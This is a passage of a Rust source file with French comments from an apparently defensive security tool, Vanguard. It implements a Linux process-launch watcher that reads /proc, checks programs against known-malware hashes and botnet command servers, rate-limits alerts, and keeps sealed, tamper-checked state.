        libc::sigaction(libc::SIGINT, &raw const action, &raw mut avant[1]);
        avant
    }
}

fn remettre_les_signaux(avant: &[libc::sigaction; 2]) {
    // SAFETY : les actions viennent de sigaction lui-même (`ecouter_les_signaux`) et sont lues pendant l'appel.
    unsafe {
        libc::sigaction(libc::SIGTERM, &raw const avant[0], std::ptr::null_mut());
        libc::sigaction(libc::SIGINT, &raw const avant[1], std::ptr::null_mut());
    }
}

fn root() -> bool {
    // SAFETY : geteuid n'a ni argument ni échec possible.
    unsafe { libc::geteuid() == 0 }
}

/// Le jeton de notre abonnement. L'accusé est envoyé à tout le groupe, et son numéro (seq) est celui du compteur
/// du noyau, qui l'écrase à l'envoi (send_msg de cn_proc.c ; relevé : notre seq ne revient jamais) ; seul son champ
/// ack, notre jeton plus un, prouve que le noyau nous a pris. Le bit haut posé : jamais l'ack = 1 d'un abonné qui
/// envoie 0. Les événements qui arrivent sans cet accusé viendraient d'un autre abonné.
fn jeton_d_abonnement() -> u32 {
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.subsec_nanos())
        .unwrap_or_default();
    ((std::process::id() ^ nanos) | 0x8000_0000).min(u32::MAX - 1)
}

/// L'erreur rendue par le noyau dans l'accusé de notre abonnement (`jeton`), ou `None` si ce n'en est pas un.
fn notre_accuse(e: &EvenementProc, jeton: u32) -> Option<u32> {
    match *e {
        EvenementProc::Accuse { ack, err, .. } if ack == jeton.wrapping_add(1) => Some(err),
        _ => None,
    }
}

/// Un jeton qui n'est pas déjà dans `deja`, pour une demande renvoyée.
fn nouveau_jeton(deja: &[u32]) -> u32 {
    let mut jeton = jeton_d_abonnement();
    while deja.contains(&jeton) {
        jeton = (jeton.wrapping_add(2) | 0x8000_0000).min(u32::MAX - 1);
    }
    jeton
}

/// Au plus tant de demandes d'abonnement, la première comprise, renvoyées après un débordement.
const DEMANDES_MAX: usize = 4;

/// S'abonne et attend l'accusé, 2 secondes au plus, même sous une rafale d'événements qui ne laisse jamais la file
/// vide. Un débordement (ENOBUFS) a pu jeter notre accusé : la demande repart avec un nouveau jeton, et l'accusé de
/// l'une ou l'autre compte (le noyau tient l'abonnement par prise : une demande de plus ne le compte pas deux fois) ;
/// sans accusé après une perte, le refus est passager, jamais définitif. L'arrêt demandé se voit en 100 ms au plus.
fn ouvrir_connecteur() -> Result<Abonnement, Refus> {
    let prise = ouvrir_prise(NETLINK_CONNECTOR, CN_IDX_PROC)?;
    let premier = jeton_d_abonnement();
    let mut jetons = vec![premier];
    if !envoyer(&prise, &demande_abonnement(PROC_CN_MCAST_LISTEN, premier)) {
        return Err(Refus::depuis_errno(errno()));
    }
    // La demande est partie : le désabonnement est dû, quoi qu'il arrive ensuite.
    let abonnement = Abonnement(prise);
    let limite = Instant::now() + Duration::from_secs(2);
    let mut tampon = vec![0u8; 16 << 10];
    let mut perte = false;
    while let Some(reste) = limite.checked_duration_since(Instant::now())
        && !arret_demande()
    {
        let ms = i32::try_from(reste.as_millis()).unwrap_or(100).clamp(1, 100);
        if attendre(&[&abonnement.0], ms).first() != Some(&true) {
            continue;
        }
        while Instant::now() < limite && !arret_demande() {
            match recevoir(&abonnement.0, &mut tampon) {
                Recu::Octets(n) => {
                    // `recv` ne rend jamais plus que le tampon ; s'il le faisait, rien de sûr à lire : une erreur.
                    let lu = tampon.get(..n).ok_or(Refus::Erreur(libc::EOVERFLOW))?;
                    for e in lire_evenements_proc(lu) {
                        if let Some(err) = jetons.iter().find_map(|&j| notre_accuse(&e, j)) {
                            return resultat_de_l_accuse(err).map(|()| abonnement);
                        }
                    }
                }
                Recu::Perdus => {
                    perte = true;
                    if jetons.len() < DEMANDES_MAX {
                        let jeton = nouveau_jeton(&jetons);
                        if envoyer(&abonnement.0, &demande_abonnement(PROC_CN_MCAST_LISTEN, jeton)) {
                            jetons.push(jeton);
                        }
                    }
                }
                Recu::Vide => break,
                Recu::Erreur(e) => return Err(Refus::Erreur(e)),
            }
        }
    }
    Err(refus_sans_accuse(arret_demande(), perte))
}

/// Le refus quand l'attente de l'accusé finit sans lui.
fn refus_sans_accuse(arret: bool, perte: bool) -> Refus {
    match (arret, perte) {
        (true, _) => Refus::Arrete,
        (false, true) => Refus::Passager,
        (false, false) => Refus::SansAccuse,
    }
}

// ───────────────────────────── Le veilleur ─────────────────────────────

/// Au-delà de tant de lectures de /proc par seconde (une compilation, un script qui boucle), les lancements sont
/// comptés « non lus » : le veilleur ne doit pas prendre tout un cœur.
const LECTURES_PAR_SECONDE: u32 = 500;
/// Ce qu'on lit au plus d'une ligne de commande.
const CMDLINE_MAX: u64 = 16 << 10;

/// Ce que le veilleur a vu pendant un tour.
#[derive(Debug)]
pub(crate) enum Vu {
    Lance(Lance),
    Prise(FinPrise),
    /// Le tampon d'un des flux a débordé : des événements sont perdus, au moins un.
    Perdus(u32),
}

/// Un programme lancé, tel que le veilleur a pu le lire.
#[derive(Debug)]
pub(crate) struct Lance {
    pub pid: u32,
    pub parent: Option<u32>,
    pub lecture: Lecture,
    pub lignee: Vec<String>,
    /// Vanguard ou lancé par lui : jamais jugé.
    pub de_vanguard: bool,
}

pub(crate) struct Veilleur {
    connecteur: Abonnement,
    /// Les fins de prises, ou pourquoi elles ne s'écoutent pas : les lancements se voient quand même.
    prises: Result<Prise, Refus>,
    table: Table,
    mon_programme: Option<String>,
    rafale: (Instant, u32),
    tampon: Vec<u8>,
    /// En pause (protection en temps réel coupée) : la table suit, mais /proc n'est plus lu.
    lire: bool,
}

fn vivant(pid: u32) -> bool {
    std::path::Path::new(&format!("/proc/{pid}")).exists()
}

fn mon_programme() -> Option<String> {
    std::env::current_exe().ok().map(|c| {
        let c = c.to_string_lossy();
        c.strip_suffix(" (deleted)").unwrap_or(&c).to_string()
    })
}

/// `/proc/<pid>/exe`, cmdline (bornée) et status, lus aussitôt et dans cet ordre : le programme part vite.
fn lire_proc(pid: u32) -> Lecture {
    let racine = PathBuf::from(format!("/proc/{pid}"));
    let exe = std::fs::read_link(racine.join("exe"))
        .ok()
        .map(|l| l.to_string_lossy().into_owned());
    let cmdline = std::fs::File::open(racine.join("cmdline")).ok().and_then(|f| {
        let mut octets = Vec::new();
        f.take(CMDLINE_MAX).read_to_end(&mut octets).ok().map(|_| octets)
    });
    let status = std::fs::read(racine.join("status")).ok().map(|o| status_lisible(&o));
    lecture_de(pid, exe, cmdline.as_deref(), status.as_deref())
}

/// Le texte de `/proc/<pid>/status`, lu en octets : le noyau y écrit le nom court tel quel (seuls \n et \\ sont
/// échappés), et un seul octet qui n'est pas de l'UTF-8 ferait perdre tout le fichier, nom, parent et état compris.
fn status_lisible(octets: &[u8]) -> String {
    String::from_utf8_lossy(octets).into_owned()
}

/// Le budget d'un tour : au plus tant de messages par flux et tant de temps en tout. Au-delà, le tour rend la main
/// même si la file n'est pas vide (le noyau garde le reste, ou le compte en débordement) : sous une rafale sans fin
/// (une fork bomb, des exec en boucle), le service doit encore voir l'arrêt demandé, écrire son battement et ses
/// pertes, lire les fins de prises, et ne garder en mémoire qu'un tour d'événements, dont 500 lectures de /proc par
/// seconde au plus (`LECTURES_PAR_SECONDE`).
const MESSAGES_PAR_TOUR: usize = 2048;
const DUREE_DE_TOUR: Duration = Duration::from_millis(200);

/// Lit les flux prêts (`pretes`) à tour de rôle, un message à la fois, pour qu'aucun n'affame l'autre : chacun
/// jusqu'à ce qu'il soit vide ou ait lu `budget` messages, et tous jusqu'à ce que le tour ait duré `duree` ou que
/// l'arrêt soit demandé. `lire(i)` lit un message du flux `i` et rend s'il y en avait un.
fn a_tour_de_role(
    pretes: &[bool],
    budget: usize,
    duree: Duration,
    arret: &dyn Fn() -> bool,
    mut lire: impl FnMut(usize) -> Result<bool, i32>,
) -> Result<(), i32> {
    let debut = Instant::now();
    let mut restants: Vec<usize> = pretes.iter().map(|&p| if p { budget } else { 0 }).collect();
    while restants.iter().any(|&r| r > 0) {
        for (i, reste) in restants.iter_mut().enumerate() {
            if *reste > 0 {
                *reste = if lire(i)? { *reste - 1 } else { 0 };
            }
        }
        if arret() || debut.elapsed() >= duree {
            break;
        }
    }
    Ok(())
}

impl Veilleur {
    /// Ouvre les deux flux. La table part des programmes déjà en marche ; les racines sont celles du bilan
    /// (`chasse::de_vanguard`) : le programme de Vanguard et ce processus, jamais leurs ancêtres (systemd de
    /// l'utilisateur, le terminal), dont tout ce qui est lancé serait sinon écarté. L'arrêt demandé pendant la
    /// lecture de /proc, qui peut être longue sous charge, est vu avant de commencer.
    pub(crate) fn ouvrir() -> Result<Veilleur, Refus> {
        let connecteur = ouvrir_connecteur()?;
        let prises = ouvrir_prise(NETLINK_SOCK_DIAG, GROUPES_FINS_DE_PRISES);
        let mon_programme = mon_programme();
        let mut table = Table::default();
        if let Some((liste, _)) = chasse::en_marche() {
            let moi = std::process::id();
            for p in &liste {
                let racine = p.pid == moi || (p.chemin.is_some() && p.chemin == mon_programme);
                table.inserer(p.pid, p.parent, &p.nom, racine, &vivant);
            }
        }
        if arret_demande() {
            return Err(Refus::Arrete);
        }
        Ok(Veilleur {
            connecteur,
            prises,
            table,
            mon_programme,
            rafale: (Instant::now(), 0),
            tampon: vec![0u8; 64 << 10],
            lire: true,
        })
    }

    /// La taille du tampon obtenue pour le connecteur.
    fn tampon(&self) -> usize {
        tampon_obtenu(&self.connecteur.0)
    }

    /// Un tour : attendre `attente` au plus, puis lire ce qui est arrivé, dans le budget d'un tour
    /// (`MESSAGES_PAR_TOUR`, `DUREE_DE_TOUR`) : le reste attend le tour suivant. `Err` : une erreur que le service ne
    /// sait pas traiter (systemd le relance).
    pub(crate) fn tour(&mut self, attente: Duration) -> Result<Vec<Vu>, i32> {
        let ms = i32::try_from(attente.as_millis()).unwrap_or(1000);
        let pretes = match &self.prises {
            Ok(p) => attendre(&[&self.connecteur.0, p], ms),
            Err(_) => attendre(&[&self.connecteur.0], ms),
        };
        let mut vus = Vec::new();
        a_tour_de_role(&pretes, MESSAGES_PAR_TOUR, DUREE_DE_TOUR, &arret_demande, |i| {
            if i == 0 {
                self.lire_un_evenement(&mut vus)
            } else {
                self.lire_une_fin_de_prise(&mut vus)
            }
        })?;
        Ok(vus)
    }

    /// Un message du connecteur ; `false` : plus rien à lire.
    fn lire_un_evenement(&mut self, vus: &mut Vec<Vu>) -> Result<bool, i32> {
        let n = match recevoir(&self.connecteur.0, &mut self.tampon) {
            Recu::Octets(n) => n,
            Recu::Perdus => {
                vus.push(Vu::Perdus(1));
                return Ok(true);
            }
            Recu::Vide => return Ok(false),
            Recu::Erreur(e) => return Err(e),
        };
        for e in lire_evenements_proc(self.tampon.get(..n).ok_or(libc::EOVERFLOW)?) {
            match e {
                EvenementProc::Fourche { parent, enfant } => self.table.fourche(parent, enfant, &vivant),
                EvenementProc::Lancement { pid } => {
                    if let Some(l) = self.lancement(pid) {
                        vus.push(Vu::Lance(l));
                    }
                }
                EvenementProc::Fin { pid, .. } => self.table.fin(pid),
                EvenementProc::Accuse { .. } | EvenementProc::Autre => {}
            }
        }
        Ok(true)
    }

    /// Un message des fins de prises ; `false` : plus rien à lire.
    fn lire_une_fin_de_prise(&mut self, vus: &mut Vec<Vu>) -> Result<bool, i32> {
        let Ok(prise) = &self.prises else {
            return Ok(false);
        };
        match recevoir(prise, &mut self.tampon) {
            Recu::Octets(n) => {
                vus.extend(
                    lire_fins_de_prises(self.tampon.get(..n).ok_or(libc::EOVERFLOW)?)
                        .into_iter()
                        .map(Vu::Prise),
                );
                Ok(true)
            }
            Recu::Perdus => {
                vus.push(Vu::Perdus(1));
                Ok(true)
            }
            Recu::Vide => Ok(false),
            Recu::Erreur(e) => Err(e),
        }
    }

    fn lancement(&mut self, pid: u32) -> Option<Lance> {
        if !self.lire {
            self.table.lancement(pid, None, false, &vivant);
            return None;
        }
        let maintenant = Instant::now();
        if maintenant.duration_since(self.rafale.0) >= Duration::from_secs(1) {
            self.rafale = (maintenant, 0);
        }
        self.rafale.1 += 1;
        let lecture = if self.rafale.1 > LECTURES_PAR_SECONDE {
            Lecture::NonLu
        } else {
            lire_proc(pid)
        };
        let lu = match &lecture {
            Lecture::Complet(p) | Lecture::NomSeul(p) => Some(p),
            Lecture::Parti | Lecture::NonLu => None,
        };
        let le_mien = lu
            .and_then(|p| p.chemin.as_deref())
            .is_some_and(|c| self.mon_programme.as_deref() == Some(c));
        self.table.lancement(pid, lu, le_mien, &vivant);
        Some(Lance {
            pid,
            parent: lu.and_then(|p| p.parent).or_else(|| self.table.parent(pid)),
            lignee: self.table.lignee(pid),
            de_vanguard: self.table.de_vanguard(pid),
            lecture,
        })
    }
}

// ───────────────────────────── Jugement, sans règle nouvelle ─────────────────────────────

/// Une alerte du veilleur, prête à noter : sa clé (pour ne pas la redire), si elle est grave (notifiée), son genre au
/// tableau de bord, son titre et son texte.
#[derive(Debug, PartialEq, Eq)]
struct Alerte {
    cle: String,
    grave: bool,
    genre: Genre,
    titre: String,
    texte: String,
}

/// Un programme lancé, jugé comme au bilan (COM-PRG-001). Celui qui n'a laissé que son nom court se juge sur ce nom
/// (un outil offensif connu ressort), et c'est dit ; celui qui est parti avant lecture ou n'a pas été lu n'est jamais
/// jugé.
fn juger_lance(l: &Lance) -> Option<Alerte> {
    if l.de_vanguard {
        return None;
    }
    let (p, nom_seul) = match &l.lecture {
        Lecture::Complet(p) => (p, false),
        Lecture::NomSeul(p) => (p, true),
        Lecture::Parti | Lecture::NonLu => return None,
    };
    let s = chasse::juger_programme(p, Os::Linux)?;
    let lignee = l
        .lignee
        .iter()
        .map(|n| crate::ui::affichable(n))
        .collect::<Vec<_>>()
        .join(" → ");
    let nom_seul = if nom_seul {
        tr!(
            " Nom court du noyau seulement (programme terminé avant lecture).",
            " Kernel short name only (program finished before it could be read)."
        )
    } else {
        ""
    };
    Some(Alerte {
        cle: format!("{}|{}", s.raison, p.chemin.as_deref().unwrap_or(&p.nom)),
        grave: s.niveau == Niveau::Eleve,
        genre: Genre::Veilleur,
        titre: tr!(
            "Vanguard : programme suspect lancé",
            "Vanguard: suspicious program started"
        )
        .to_string(),
        texte: trf!(
            "{} ; lignée : {lignee} ; vu au lancement par le veilleur.{nom_seul} Ne rien arrêter à la hâte : vanguard depanner traces garde ses traces, puis Dépanner › Après une infection s'il n'est pas à vous.",
            "{}; lineage: {lignee}; seen at start by the watcher.{nom_seul} Do not stop anything in a hurry: vanguard depanner traces keeps its traces, then Troubleshoot › After an infection if it is not yours.",
            chasse::montrer(p, &s)
        ),
    })
}

/// Un programme lancé, jugé par la voie unique des sources de menaces (`protection::sources`) : d'abord son empreinte
/// (MalwareBazaar, les dernières 48 heures : la liste complète ne tient pas dans la mémoire du service), comme le
/// blocage et le bilan, puis les signes de COM-PRG-001.
fn juger_lance_avec(l: &Lance, fichiers: &mut crate::protection::sources::Fichiers) -> Option<Alerte> {
    if !l.de_vanguard
        && let Lecture::Complet(p) = &l.lecture
        && let Some(chemin) = p.chemin.as_deref()
        && fichiers.connu(chemin)
    {
        let raison = crate::protection::sources::raison_empreinte();
        return Some(Alerte {
            cle: format!("{raison}|{chemin}"),
            grave: true,
            genre: Genre::Veilleur,
            titre: tr!(
                "Vanguard : logiciel malveillant connu lancé",
                "Vanguard: known malware started"
            )
            .to_string(),
            texte: trf!(
                "« {} » (PID {}) : {raison}. Ne rien arrêter à la hâte : vanguard depanner traces garde ses traces, puis Dépanner › Après une infection.",
                "“{}” (PID {}): {raison}. Do not stop anything in a hurry: vanguard depanner traces keeps its traces, then Troubleshoot › After an infection.",
                crate::ui::affichable(chemin),
                l.pid
            ),
        });
    }
    juger_lance(l)
}

/// Une connexion fermée, jugée par les serveurs de commande connus : seulement vers Internet.
fn juger_prise(f: &FinPrise, serveurs: &ServeursDeCommande) -> Option<Alerte> {
    let ip = f.distante.ip().to_canonical();
    if !crate::socle::adresses::sur_internet(ip) {
        return None;
    }
    let serveur = serveurs.serveur(ip, f.distante.port())?;
    let protocole = match f.protocole {
        Some(17) => "UDP",
        Some(6) => "TCP",
        _ => "TCP/UDP",
    };
    Some(Alerte {
        cle: SocketAddr::new(ip, f.distante.port()).to_string(),
        grave: true,
        genre: Genre::Botnet,
        titre: tr!(
            "Vanguard : connexion fermée avec un serveur de botnet",
            "Vanguard: closed connection with a botnet server"
        )
        .to_string(),
        texte: trf!(
            "{serveur} : connexion {protocole} avec un serveur de commande connu, fermée. Le programme n'est plus connu : le noyau ne le donne pas à la fin d'une connexion. Ouvrez « Après une infection » : coupez Internet d'abord.",
            "{serveur}: {protocole} connection with a known command server, closed. The program is no longer known: the kernel does not give it at the end of a connection. Open “After an infection”: cut the Internet first."
        ),
    })
}

// ───────────────────────────── Débit, pur ─────────────────────────────

/// Une même alerte n'est redite qu'après 6 heures.
const REDIRE_APRES: i64 = 6 * 3600;
const DEJA_MAX: usize = 1024;
/// Au journal, au plus 10 alertes par heure et 20 par jour : il en garde 500 en tout (`tableau`), et celles de la
/// surveillance ne doivent pas en être chassées.
const JOURNAL_PAR_HEURE: usize = 10;
const JOURNAL_PAR_JOUR: usize = 20;
/// Au plus 3 notifications par tranche de 10 minutes, et seulement pour le grave.
const NOTIFICATIONS: usize = 3;
const TRANCHE_NOTIFICATIONS: i64 = 600;

#[derive(Debug, PartialEq, Eq)]
enum Decision {
    Noter {
        notifier: bool,
    },
    /// Déjà notée il y a moins de 6 heures.
    Repete,
    /// Au-delà du débit : comptée, puis dite dans le résumé.
    Taire,
}

#[derive(Debug, Default)]
struct Debit {
    deja: HashMap<String, i64>,
    journal: VecDeque<i64>,
    notifications: VecDeque<i64>,
    tues: u32,
    dernier_resume: Option<i64>,
}

impl Debit {
    fn decider(&mut self, cle: &str, grave: bool, maintenant: i64) -> Decision {
        if self
            .deja
            .get(cle)
            .is_some_and(|&quand| maintenant.saturating_sub(quand) < REDIRE_APRES && quand <= maintenant)
        {
            return Decision::Repete;
        }
        if self.deja.len() >= DEJA_MAX && !self.deja.contains_key(cle) {
            self.deja
                .retain(|_, &mut quand| maintenant.saturating_sub(quand) < REDIRE_APRES);
            if self.deja.len() >= DEJA_MAX
                && let Some(plus_vieille) = self.deja.iter().min_by_key(|(_, q)| **q).map(|(c, _)| c.clone())
            {
                self.deja.remove(&plus_vieille);
            }
        }
        self.deja.insert(cle.to_string(), maintenant);
        self.journal.retain(|&q| maintenant.saturating_sub(q) < 24 * 3600);
        let derniere_heure = self
            .journal
            .iter()
            .filter(|&&q| maintenant.saturating_sub(q) < 3600)
            .count();
        if derniere_heure >= JOURNAL_PAR_HEURE || self.journal.len() >= JOURNAL_PAR_JOUR {
            self.tues += 1;
            return Decision::Taire;
        }
        self.journal.push_back(maintenant);
        self.notifications
            .retain(|&q| maintenant.saturating_sub(q) < TRANCHE_NOTIFICATIONS);
        let notifier = grave && self.notifications.len() < NOTIFICATIONS;
        if notifier {
            self.notifications.push_back(maintenant);
        }
        Decision::Noter { notifier }
    }

    /// Le nombre d'alertes tues à dire maintenant, au plus une fois par heure.
    fn resume(&mut self, maintenant: i64) -> Option<u32> {
        if self.tues == 0 || self.dernier_resume.is_some_and(|d| maintenant.saturating_sub(d) < 3600) {
            return None;
        }
        self.dernier_resume = Some(maintenant);
        Some(std::mem::take(&mut self.tues))
    }
}

// ───────────────────────────── État, sur le disque ─────────────────────────────

/// Ce que le service écrit toutes les minutes, et que le bilan et le menu relisent. Aucune ligne de commande n'y va.
#[derive(Debug, Default, Clone, serde::Serialize, serde::Deserialize)]
#[serde(default)]
pub(crate) struct Etat {
    pub pid: u32,
    /// Secondes depuis 1970, comme `battement`.
    pub depuis: i64,
    pub battement: i64,
    pub lancements: u64,
    pub lus: u64,
    /// Parmi les lus en entier, ceux d'un autre compte : la ligne de commande seule, leur programme ne se lisant pas
    /// sans droits (le dossier d'où ils partent n'est donc pas jugé).
    pub sans_programme: u64,
    pub noms_seuls: u64,
    pub partis: u64,
    pub non_lus: u64,
    /// Les programmes qu'on n'a pas pu hacher à temps (un fichier qui ne répond pas) : non vérifiés.
    pub non_haches: u64,
    pub prises: u64,
    pub perdus: u64,
    pub tus: u64,
    pub tampon: usize,
    /// Les listes de serveurs de commande qui n'ont pas pu servir ; `None` : toutes vérifiées.
    pub listes: Option<String>,
    /// Pourquoi les fins de prises ne s'écoutent pas ; `None` : elles s'écoutent.
    pub sans_prises: Option<String>,
    /// /proc ne montre que les programmes du compte (hidepid) : ceux des autres passent pour partis.
    pub masque: bool,
    pub en_pause: bool,
    pub raison_arret: Option<String>,
    /// Les derniers partis avant lecture : (PID, parent s'il était connu).
    pub derniers_partis: Vec<(u32, Option<u32>)>,
    // ── Veille anti-rançongiciel (dossiers personnels) ──
    /// La surveillance des fichiers est allumée (accord donné) et en marche.
    pub rancon_actif: bool,
    /// Changements de fichiers vus en direct.
    pub rancon_changements: u64,
    /// Rafales jugées Grave ou plus.
    pub rancon_rafales: u64,
    /// Rançongiciels gelés (quasi certains).
    pub rancon_gels: u64,
    /// Débordements de la file de surveillance des fichiers.
    pub rancon_perdus: u64,
    /// Les PID restés gelés par le veilleur (un tiers peut les reprendre : la surveillance horaire le dit).
    pub pids_geles: Vec<u32>,
    /// Pourquoi la veille des fichiers ne tourne pas, alors qu'elle est voulue (notify indisponible, aucun dossier).
    pub rancon_sans: Option<String>,
}

const DERNIERS_PARTIS: usize = 10;

/// Le choix de la personne, noté à l'allumage : si l'unité disparaît sans qu'elle l'ait coupée, le bilan le dit.
fn fichier_voulu() -> PathBuf {
    crate::socle::dossier_local().join(VOULU)
}

/// Le veilleur est-il voulu ? La marque, ou l'état scellé des défenses voulues (`voulues`) : la marque effacée seule
/// ne le fait pas oublier.
pub(crate) fn voulu() -> bool {
    fichier_voulu().is_file() || matches!(voulues::souvenir(Defense::Veilleur), voulues::Souvenir::Voulue(_))
}

fn marquer(fichier: &std::path::Path) {
    if let Some(d) = fichier.parent() {
        let _ = std::fs::create_dir_all(d);
    }
    let _ = std::fs::write(fichier, b"");
}

/// Le fichier qui note le choix de surveiller les dossiers contre les rançongiciels.
fn fichier_rancon_voulu() -> PathBuf {
    crate::socle::dossier_local().join(RANCON_VOULU)
}

/// La veille anti-rançongiciel est-elle voulue ? L'état scellé seul (`voulues`) : effacer la marque ne la coupe pas,
/// et la poser ne l'allume pas (elle peut geler un programme : c'est un accord à part, donné par le geste). La marque
/// d'une version d'avant est reprise une fois, à la mise à jour (`adopter_les_marques`). Un état qui ne peut pas
/// être cru ne l'allume pas, mais le bilan le dit.
pub(crate) fn rancon_voulu() -> bool {
    matches!(voulues::souvenir(Defense::Rancongiciel), voulues::Souvenir::Voulue(_))
}

/// Parmi `pids`, ceux qui sont encore gelés (état « T ») : un PID mort ou repris par un autre processus ne l'est
/// plus, et ne doit ni être dit gelé ni recevoir de SIGCONT.
fn encore_geles(pids: Vec<u32>) -> Vec<u32> {
    pids.into_iter()
        .filter(|&p| crate::socle::processus::est_gele(p) == Some(true))
        .collect()
}

/// L'état écrit par le service, s'il est tel qu'il l'a écrit (scellé, `sceau`), et sinon pourquoi il ne peut pas
/// être cru. Forgé, il faisait passer un faux veilleur pour vivant, compteurs à zéro, et ses `pids_geles` recevaient
/// SIGCONT : il n'est alors ni cru ni rejoué.
fn lire_etat_dans(dossier: &std::path::Path) -> (Option<Etat>, Option<String>) {
    use crate::sceau::Lecture as L;
    let octets = match crate::sceau::lire_dans(dossier, ETAT) {
        L::Absent | L::Inconnu => return (None, None),
        L::Intact(o) => o,
        // Accepté tel quel à la mise à jour d'une version qui l'écrivait sans sceau : écrit par le veilleur.
        L::Adopte(o) if crate::sceau::repris_dans(dossier, ETAT) => o,
        L::Adopte(_) => {
            return (
                None,
                Some(
                    tr!(
                        "son état a été accepté tel quel après des sceaux refaits",
                        "its state was accepted as it was after seals were remade"
                    )
                    .to_string(),
                ),
            );
        }
        L::Falsifie(_) => {
            return (
                None,
                Some(
                    tr!(
                        "son état a été changé hors de Vanguard",
                        "its state was changed outside Vanguard"
                    )
                    .to_string(),
                ),
            );
        }
        L::Illisible(e) => {
            return (
                None,
                Some(trf!("son état ne se lit pas : {e}", "its state cannot be read: {e}")),
            );
        }
    };
    match serde_json::from_slice(&octets) {
        Ok(e) => (Some(e), None),
        Err(e) => (
            None,
            Some(trf!("son état ne se lit pas : {e}", "its state cannot be read: {e}")),
        ),
    }
}

fn lire_etat() -> Option<Etat> {
    lire_etat_dans(&crate::socle::dossier_local()).0
}

fn ecrire_etat(etat: &Etat) {
    if let Ok(texte) = serde_json::to_string(etat) {
        let _ = crate::sceau::ecrire(ETAT, texte);
    }
}

fn maintenant() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_or(0, |d| i64::try_from(d.as_secs()).unwrap_or(i64::MAX))
}

/// Le service tourne-t-il vraiment ? Un battement de moins de 3 minutes, et le processus noté est bien le veilleur
/// (un numéro repris par un autre programme ne compte pas).
fn vivant_d_apres(etat: &Etat, maintenant: i64) -> bool {
    vivant_selon(etat, maintenant, programme_de_l_unite().as_deref())
}

/// `vivant_d_apres`, contre le programme `attendu` de l'unité : la ligne de commande s'imite, l'image lancée non.
fn vivant_selon(etat: &Etat, maintenant: i64, attendu: Option<&std::path::Path>) -> bool {
    frais(etat, maintenant) && en_marche(etat) && lance_le_programme(etat.pid, attendu)
}

fn frais(etat: &Etat, maintenant: i64) -> bool {
    (0..180).contains(&maintenant.saturating_sub(etat.battement))
}

/// Le programme que lance l'unité (ExecStart=), seulement si c'est bien celle de Vanguard.
fn programme_de_l_unite() -> Option<PathBuf> {
    let texte = std::fs::read_to_string(fichier_unite()).ok()?;
    if !notre_unite(&texte) {
        return None;
    }
    crate::reseau::surveillance::programme_d_une_unite(&texte)
}

/// Le processus `pid` lance-t-il le programme `attendu` ? Lu dans `/proc/<pid>/exe`, l'image lancée : un faux veilleur
/// qui imite la ligne de commande et réécrit l'état ne passe pas pour vivant. Un programme remplacé depuis son
/// lancement (« … (deleted) ») ne compte pas non plus : ce n'est plus celui que le bilan juge sur le disque.
fn lance_le_programme(pid: u32, attendu: Option<&std::path::Path>) -> bool {
    let Some(attendu) = attendu.and_then(|a| a.canonicalize().ok()) else {
        return false;
    };
    pid != 0 && std::fs::read_link(format!("/proc/{pid}/exe")).is_ok_and(|e| e == attendu)
}

/// Les marques d'une version d'avant (veilleur, veille anti-rançongiciel) sans rien de noté dans l'état scellé :
/// notées voulues (`voulues::adopter`, jamais par-dessus un arrêt noté ni un état douteux).
fn adopter_les_marques() {
    if fichier_voulu().is_file() {
        voulues::adopter(Defense::Veilleur);
    }
    if fichier_rancon_voulu().is_file() {
        voulues::adopter_d_avant_dans(&crate::socle::dossier_local(), Defense::Rancongiciel);
    }
}

/// L'unité du veilleur lance-t-elle `cible` ? Une mise à jour de ce programme doit alors relancer le service, même si
/// rien n'est encore noté pour lui (posé par une version d'avant).
pub(crate) fn lance_la_copie(cible: &std::path::Path) -> bool {
    programme_de_l_unite().is_some_and(|p| crate::programmes_poses::meme_chemin(&p, cible))
}

/// Le processus noté dans l'état est-il le veilleur d'avant une mise à jour ? Sa ligne de commande est celle du
/// veilleur, et son image est le programme de l'unité, effacé depuis (« … (deleted) ») : remplacé par une mise à jour
/// (Vanguard, gestionnaire de paquets, cargo) pendant qu'il tournait. Lu dans le fichier tel quel : le veilleur d'avant
/// la 0.88 l'écrit sans sceau, et c'est la seule trace de son numéro. Rien n'est cru de ses compteurs.
fn ancien_veilleur(dossier: &std::path::Path, attendu: Option<&std::path::Path>) -> Option<u32> {
    let attendu = attendu?.canonicalize().ok()?;
    let texte = crate::socle::lire_texte_ordinaire(&dossier.join(ETAT), 1 << 20).ok()?;
    let e: Etat = serde_json::from_str(&texte).ok()?;
    let image = std::fs::read_link(format!("/proc/{}/exe", e.pid)).ok()?;
    let avant = image.to_str()?.strip_suffix(" (deleted)")?;
    (en_marche(&e) && std::path::Path::new(avant) == attendu).then_some(e.pid)
}

/// L'état du veilleur ne se lit pas comme scellé parce que le veilleur d'avant une mise à jour l'écrit encore : pas
/// une falsification (`sceau::constat` ne le dit pas changé hors de Vanguard ; le bilan du veilleur dit le remède).
pub(crate) fn etat_ecrit_par_l_ancien() -> bool {
    ancien_veilleur(&crate::socle::dossier_local(), programme_de_l_unite().as_deref()).is_some()
}

/// Relance le service s'il est en marche : après une mise à jour de la copie qu'il lance (`mise_a_jour`), il
/// garderait sinon l'ancienne en mémoire.
pub(crate) fn relancer_si_actif() {
    let _ = super::dbus::actions::utilisateur(super::dbus::actions::Geste::RedemarrerSiActive, UNITE);
}

/// Le processus noté dans l'état est-il encore le veilleur ?
fn en_marche(etat: &Etat) -> bool {
    etat.pid != 0
        && std::fs::read(format!("/proc/{}/cmdline", etat.pid)).is_ok_and(|o| {
            let mots: Vec<&[u8]> = o.split(|&b| b == 0).collect();
            mots.contains(&b"veilleur".as_slice()) && mots.contains(&b"--servir".as_slice())
        })
}

// ───────────────────────────── Le service ─────────────────────────────

/// Le service, au premier plan, lancé par systemd (`vanguard veilleur --servir`). Rend la sortie : 0 à l'arrêt
/// demandé, 1 sur une erreur inattendue ou passagère (systemd le relance), 77 sur un refus que relancer ne changerait
/// pas (`Refus::sortie`).
fn servir() -> i32 {
    let mut etat = Etat {
        pid: std::process::id(),
        depuis: maintenant(),
        battement: maintenant(),
        // Un redémarrage (Restart=on-failure, mise à jour, « rancongiciel on ») ne doit pas oublier un programme resté
        // gelé : seul ce fichier permet à « off » ou au retrait de le reprendre. Un PID mort, ou repris par un
        // processus qui n'est pas gelé, est écarté.
        pids_geles: encore_geles(lire_etat().map(|e| e.pids_geles).unwrap_or_default()),
        ..Etat::default()
    };
    let refuser = |etat: &mut Etat, raison: String| {
        eprintln!("{raison}");
